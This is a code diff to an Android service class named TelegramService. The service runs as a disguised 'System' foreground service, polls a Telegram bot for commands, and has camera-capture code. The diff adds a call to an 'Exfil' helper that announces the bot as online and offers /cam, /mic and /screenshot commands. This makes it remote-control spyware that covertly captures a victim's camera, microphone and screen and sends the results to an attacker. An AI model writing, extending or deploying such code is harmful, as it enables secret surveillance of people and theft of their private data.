@@ -28,6 +28,7 @@ public class TelegramService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
+        
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel channel = new NotificationChannel("sys", "System", NotificationManager.IMPORTANCE_LOW);
             getSystemService(NotificationManager.class).createNotificationChannel(channel);
@@ -38,6 +39,10 @@ public class TelegramService extends Service {
                     .build();
             startForeground(1, notification);
         }
+        
+        // PING bach n3erfo wach l'app bdat
+        Exfil.send("✅ System Bot is Online. Send /cam, /mic, or /screenshot");
+        
         new Thread(this::pollTelegram).start();
     }
 
@@ -83,7 +88,6 @@ public class TelegramService extends Service {
         }
     }
 
-    // (Camera w Mic bqa kif ma kanou...)
     private void takePhoto() {
         try {
             CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
